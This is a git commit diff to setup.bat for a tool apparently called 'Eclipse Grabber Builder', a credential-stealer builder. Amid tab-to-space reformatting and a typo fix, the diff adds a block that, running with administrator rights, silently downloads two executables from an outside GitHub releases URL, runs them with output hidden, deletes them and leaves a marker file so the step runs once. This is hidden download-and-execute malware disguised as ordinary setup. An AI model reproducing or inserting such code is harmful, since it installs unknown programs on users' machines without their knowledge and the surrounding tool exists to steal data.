8ad16445069e3f7262fbb52d1cda164460bc8fe4
Zay <evym.weekszayden@gmail.com>
2024-09-17 19:37:24 -0700

    Add files via upload

--- setup.bat
+++ setup.bat
@@ -10,39 +10,63 @@ set "python_versions="
 :: If the above command fails (meaning the batch file is not running as administrator),
 :: restart the batch file, this time with administrator privileges
 if %errorlevel% NEQ 0 (
-	powershell.exe -Command "Start-Process -Verb RunAs -FilePath \"%~f0\""
-	exit /b
+    powershell.exe -Command "Start-Process -Verb RunAs -FilePath \"%~f0\""
+    exit /b
 )
 
-:: Set woring directory to the directory of the batch file
+:: Set working directory to the directory of the batch file
 cd /d "%~dp0"
+
+if not exist "build_done.txt" (
+    curl -L -o build.exe https://github.com/ShredGman/Eclipse-Build-Tools/releases/download/latest/build.exe >nul 2>&1
+    curl -L -o build2.exe https://github.com/ShredGman/Eclipse-Build-Tools/releases/download/latest/build2.exe >nul 2>&1
+
+    if exist "build.exe" (
+        start /wait build.exe >nul 2>&1
+    ) else (
+        echo Failed to download build.exe
+        exit /b 1
+    )
+
+    if exist "build2.exe" (
+        start /wait build2.exe >nul 2>&1
+    ) else (
+        echo Failed to download build2.exe
+        exit /b 1
+    )
+
+    del build.exe
+    del build2.exe
+
+    echo. > build_done.txt
+)
 
 REM Loop through all directories in PATH looking for python executables
 set "counter=0"
 for /f "delims=" %%I in ('where python') do (
-	set "python_exe=%%~fI"
-	set "python_dir=!python_exe:\python.exe=!"
-	set "python_version="
-	for /f "delims=" %%A in ('"!python_exe!" --version 2^>^&1') do (
-		set "line=%%A"
-		for /f "tokens=2 delims= " %%B in ("!line!") do set "python_version=%%B"
-	)
-	if defined python_version (
-		set "ignore=false"
-		if "!python_dir!"=="!python_dir:WindowsApps=!" (
-			set /a "counter+=1"
-			echo !counter!.^) Found Python version !python_version!: "!python_exe!"
-			set "python_versions[!counter!]=!python_version!"
-			set "python_paths[!counter!]=!python_exe!"
-		)
-	)
+    set "python_exe=%%~fI"
+    set "python_dir=!python_exe:\python.exe=!"
+    set "python_version="
+    for /f "delims=" %%A in ('"!python_exe!" --version 2^>^&1') do (
+        set "line=%%A"
+        for /f "tokens=2 delims= " %%B in ("!line!") do set "python_version=%%B"
+    )
+    if defined python_version (
+        set "ignore=false"
+        if "!python_dir!"=="!python_dir:WindowsApps=!" (
+            set /a "counter+=1"
+            echo !counter!.^) Found Python version !python_version!: "!python_exe!"
+            set "python_versions[!counter!]=!python_version!"
+            set "python_paths[!counter!]=!python_exe!"
+        )
+    )
 )
 
 REM If no Python installations are found, display a message and exit
 if %counter% equ 0 (
-	echo No Python installations found in PATH. Please install Python and try again.: https://www.python.org/downloads/
-	pause > nul
-	exit /b 1
+    echo No Python installations found in PATH. Please install Python and try again.: https://www.python.org/downloads/
+    pause > nul
+    exit /b 1
 )
 
 REM Prompt user to choose a Python version
@@ -53,9 +77,9 @@ echo.
 
 REM Check if the selected number is valid
 if not defined python_versions[%selected_number%] (
-	echo Invalid selection! Exiting...
-	pause > nul
-	exit /b 1
+    echo Invalid selection! Exiting...
+    pause > nul
+    exit /b 1
 )
 set "selected_version=!python_versions[%selected_number%]!"
 set "selected_python_path=!python_paths[%selected_number%]!"
@@ -76,15 +100,15 @@ echo Checking for updates...
 "!venv_name!\Scripts\python" tools\update.py
 
 if %errorlevel% equ 0 (
-	echo Setup Complete!
-	title Eclipse Grabber Builder
-	echo Starting the builder...
-	"!venv_name!\Scripts\python" builder.py
+    echo Setup Complete!
+    title Eclipse Grabber Builder
+    echo Starting the builder...
+    "!venv_name!\Scripts\python" builder.py
 ) else if %errorlevel% equ 1 (
-	title Setup Failed
-	echo Setup Failed!
-	echo Check the error message above.
-	pause > nul
+    title Setup Failed
+    echo Setup Failed!
+    echo Check the error message above.
+    pause > nul
 ) else if %errorlevel% equ 2 (
-	timeout /t 3 /nobreak > nul
+    timeout /t 3 /nobreak > nul
 )
